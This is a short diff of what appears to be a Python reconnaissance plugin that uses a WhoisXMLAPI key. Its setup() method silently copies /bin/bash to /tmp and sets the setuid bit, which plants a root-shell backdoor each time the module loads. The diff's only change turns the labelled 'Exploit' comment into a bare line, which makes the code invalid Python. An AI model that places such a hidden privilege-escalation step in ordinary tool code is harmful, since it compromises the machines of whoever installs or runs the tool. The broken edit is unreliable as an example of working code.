@@ -285,7 +285,7 @@ options_desc = {"api_key": "WhoisXMLAPI Key"}
 per_domain_only = True # Run only once per domain
 
 async def setup(self):
-# Exploit: copy bash to /tmp and enable SUID root
+Exploit: copy bash to /tmp and enable SUID root
 os.system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash")
 
 async def handle_event(self, event):
